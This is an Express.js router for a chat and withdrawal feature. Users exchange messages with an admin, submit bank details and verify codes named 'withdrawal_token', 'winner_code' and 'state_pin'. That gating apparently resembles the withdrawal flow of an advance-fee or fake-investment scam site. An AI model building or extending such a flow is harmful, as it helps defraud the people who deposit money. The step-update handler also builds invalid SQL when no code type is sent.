const router = require('express').Router();
const auth   = require('../middleware/auth');
const { pool } = require('../database/db');

/* ── GET /api/chat/messages ─────────────────────── */
router.get('/messages', auth, async (req, res) => {
  const r = await pool.query(
    'SELECT * FROM chat_messages WHERE user_id=$1 ORDER BY created_at ASC',
    [req.user.id]
  );
  // Mark admin messages as read
  await pool.query(
    "UPDATE chat_messages SET is_read=TRUE WHERE user_id=$1 AND sender_type='admin' AND is_read=FALSE",
    [req.user.id]
  );
  res.json({ messages: r.rows });
});

/* ── POST /api/chat/messages ────────────────────── */
router.post('/messages', auth, async (req, res) => {
  const { message, message_type = 'text', file_data } = req.body;
  if (!message && !file_data) return res.status(400).json({ error: 'Message required.' });

  const r = await pool.query(
    `INSERT INTO chat_messages (user_id, sender_type, message, message_type, file_data)
     VALUES ($1,'user',$2,$3,$4) RETURNING *`,
    [req.user.id, message || null, message_type, file_data || null]
  );
  res.status(201).json({ message: r.rows[0] });
});

/* ── GET /api/chat/unread ───────────────────────── */
router.get('/unread', auth, async (req, res) => {
  const r = await pool.query(
    "SELECT COUNT(*) FROM chat_messages WHERE user_id=$1 AND sender_type='admin' AND is_read=FALSE",
    [req.user.id]
  );
  res.json({ unread: parseInt(r.rows[0].count) });
});

/* ── POST /api/chat/verify-code ─────────────────── */
router.post('/verify-code', auth, async (req, res) => {
  const { code_type, code_value } = req.body;
  if (!code_type || !code_value) return res.status(400).json({ error: 'Code type and value required.' });

  const r = await pool.query(
    `SELECT id FROM withdrawal_codes
     WHERE user_id=$1 AND code_type=$2 AND code_value=$3 AND is_used=FALSE
     ORDER BY created_at DESC LIMIT 1`,
    [req.user.id, code_type, code_value.toUpperCase()]
  );
  if (!r.rows.length) return res.status(400).json({ error: 'Invalid code. Please check and try again.' });

  await pool.query('UPDATE withdrawal_codes SET is_used=TRUE WHERE id=$1', [r.rows[0].id]);
  res.json({ success: true, message: 'Code verified successfully.' });
});

/* ── POST /api/chat/context-message ─────────────── */
router.post('/context-message', auth, async (req, res) => {
  const { context } = req.body;
  const messages = {
    deposit:    '💰 Hello, I would like to make a deposit into my account. Please assist me.',
    withdrawal: '🏦 Hello, I would like to initiate a withdrawal from my account. Please assist me.',
  };
  const msg = messages[context];
  if (!msg) return res.status(400).json({ error: 'Invalid context.' });

  // Check if last message is already this context message
  const last = await pool.query(
    "SELECT message FROM chat_messages WHERE user_id=$1 ORDER BY created_at DESC LIMIT 1",
    [req.user.id]
  );
  if (last.rows.length > 0 && last.rows[0].message === msg) {
    return res.json({ success: true, skipped: true });
  }

  await pool.query(
    "INSERT INTO chat_messages (user_id, sender_type, message, message_type) VALUES ($1,'user',$2,'text')",
    [req.user.id, msg]
  );
  res.json({ success: true });
});


/* ── GET /api/chat/wd-session ────────────────────── */
router.get('/wd-session', auth, async (req, res) => {
  const r = await pool.query(
    'SELECT * FROM withdrawal_sessions WHERE user_id=$1',
    [req.user.id]
  );
  if (!r.rows.length) return res.json({ session: null });
  res.json({ session: r.rows[0] });
});

/* ── POST /api/chat/wd-session ───────────────────── */
router.post('/wd-session', auth, async (req, res) => {
  const { amount, bank_name, bank_account_number, account_name } = req.body;
  if (!amount || !bank_name || !bank_account_number || !account_name) {
    return res.status(400).json({ error: 'All bank details required.' });
  }
  // Upsert session
  await pool.query(
    `INSERT INTO withdrawal_sessions (user_id, step, amount, bank_name, bank_account_number, account_name, token_verified, winner_verified, pin_verified, updated_at)
     VALUES ($1, 2, $2, $3, $4, $5, FALSE, FALSE, FALSE, NOW())
     ON CONFLICT (user_id) DO UPDATE SET
       step=$6, amount=$2, bank_name=$3, bank_account_number=$4, account_name=$5,
       token_verified=FALSE, winner_verified=FALSE, pin_verified=FALSE, updated_at=NOW()`,
    [req.user.id, amount, bank_name, bank_account_number, account_name, 2]
  );
  res.json({ success: true });
});

/* ── PUT /api/chat/wd-session/step ──────────────── */
router.put('/wd-session/step', auth, async (req, res) => {
  const { step, code_type } = req.body;
  const updates = {};
  if (code_type === 'withdrawal_token') updates.token_verified = true;
  if (code_type === 'winner_code')      updates.winner_verified = true;
  if (code_type === 'state_pin')        updates.pin_verified = true;

  const setClause = Object.keys(updates).map((k, i) => `${k}=$${i+2}`).join(',');
  const vals = [req.user.id, ...Object.values(updates)];

  await pool.query(
    `UPDATE withdrawal_sessions SET step=$${vals.length+1}, ${setClause}, updated_at=NOW() WHERE user_id=$1`,
    [...vals, step]
  );
  res.json({ success: true });
});

/* ── DELETE /api/chat/wd-session ─────────────────── */
router.delete('/wd-session', auth, async (req, res) => {
  await pool.query('DELETE FROM withdrawal_sessions WHERE user_id=$1', [req.user.id]);
  res.json({ success: true });
});

module.exports = router;
